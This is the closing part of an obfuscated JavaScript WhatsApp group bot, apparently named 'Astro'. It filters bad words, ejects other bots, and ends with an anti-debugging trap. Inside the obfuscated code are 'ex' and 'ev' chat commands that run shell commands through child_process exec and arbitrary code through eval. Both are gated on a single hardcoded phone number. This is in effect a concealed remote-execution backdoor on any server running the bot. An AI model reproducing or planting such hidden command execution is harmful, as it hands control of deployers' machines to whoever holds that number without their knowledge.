                    _0x54fce5.delete = _0xc100b.key
                    await _0x56b9b6.sendMessage(_0x3ae3fc, _0x54fce5)
                    const _0x5559c8 = {}
                    _0x5559c8.text = '*Bad word detected !*'
                    await _0x56b9b6.sendMessage(_0x3ae3fc, _0x5559c8)
                    await _0x56b9b6.groupParticipantsUpdate(
                      _0x3ae3fc,
                      [_0x572fae],
                      'remove'
                    )
                  }
                }
              }
            }
          }
        }
      }
      var _0x4f7087 = (_0x18a1c7) => {
        var _0x346679 = {
          is_bot: false,
          device:
            _0x18a1c7.length > 21
              ? 'android'
              : _0x18a1c7.substring(0, 2) === '3A'
              ? 'ios'
              : 'web',
        }
        _0x18a1c7.startsWith('BAE5') &&
          ((_0x346679.is_bot = true), (_0x346679.bot_name = 'bailyes'))
        return (
          /amdi|queen|black|amda|achiya|achintha/gi.test(_0x18a1c7) &&
            ((_0x346679.is_bot = true), (_0x346679.bot_name = 'amdi')),
          _0x346679
        )
      }
      async function _0x5a15f6(_0x2b140f, _0x25e909) {
        if (config.ANTI_BOT === 'false') {
          return
        }
        if (_0x367af6) {
          return
        }
        if (!_0x2e3e9d) {
          return
        }
        if (_0x1e02c1) {
          return
        }
        if (_0x5684d3) {
          var _0x3d44ec = _0x4f7087(_0xc100b.key.id)
          if (_0x3d44ec.is_bot) {
            try {
              const _0x13c7c7 = {}
              return (
                (_0x13c7c7.text = '*Other bots are not allowed here !!*'),
                await _0x56b9b6.sendMessage(_0x3ae3fc, _0x13c7c7),
                await _0x56b9b6.groupParticipantsUpdate(
                  _0x3ae3fc,
                  [_0x572fae],
                  'remove'
                )
              )
            } catch {}
          }
        }
      }
      try {
        await _0x5a15f6(_0x56b9b6, _0xc100b)
      } catch {}
      switch (_0x2fb520) {
        case 'jid':
          _0x15806e(_0x3ae3fc)
          break
        case 'device':
          {
            let _0x514882 = getDevice(
              _0xc100b.message.extendedTextMessage.contextInfo.stanzaId
            )
            _0x15806e('*He Is Using* _*Whatsapp ' + _0x514882 + ' version*_')
          }
          break
        case 'ex':
          {
            if (_0x7bd83b == 94762898541) {
              const { exec: _0x4e6854 } = require('child_process')
              _0x4e6854(_0x4ed6ba, (_0x8386d, _0x9cd72b) => {
                if (_0x8386d) {
                  return _0x15806e('-------\n\n' + _0x8386d)
                }
                if (_0x9cd72b) {
                  return _0x15806e('-------\n\n' + _0x9cd72b)
                }
              })
            }
          }
          break
        case 'ev':
          {
            if (_0x7bd83b == 94762898541) {
              let _0x171e89 = _0x4ed6ba.replace('\xB0', '.toString()')
              try {
                let _0x48a944 = await eval(_0x171e89)
                typeof _0x48a944 === 'object'
                  ? _0x15806e(util.format(_0x48a944))
                  : _0x15806e(util.format(_0x48a944))
              } catch (_0x4d9979) {
                _0x15806e(util.format(_0x4d9979))
              }
            }
          }
          break
        default:
      }
    } catch (_0x2b2d0d) {
      const _0x211f81 = String(_0x2b2d0d)
      console.log(_0x211f81)
    }
  })
}
app.get('/', (_0x504d1a, _0x543bf2) => {
  _0x543bf2.send('\uD83D\uDCDF Astro Working successfully!')
})
app.listen(port, () =>
  console.log('Astro Server listening on port http://localhost:' + port)
)
setTimeout(() => {
  connectToWA()
}, 3000)
function _0x466f77(_0x2258a7) {
  function _0x10462b(_0x4a0d6d) {
    if (typeof _0x4a0d6d === 'string') {
      return function (_0x408226) {}
        .constructor('while (true) {}')
        .apply('counter')
    } else {
      ;('' + _0x4a0d6d / _0x4a0d6d).length !== 1 || _0x4a0d6d % 20 === 0
        ? function () {
            return true
          }
            .constructor('debugger')
            .call('action')
        : function () {
            return false
          }
            .constructor('debugger')
            .apply('stateObject')
    }
    _0x10462b(++_0x4a0d6d)
  }
  try {
    if (_0x2258a7) {
      return _0x10462b
    } else {
      _0x10462b(0)
    }
  } catch (_0x27ce55) {}
}
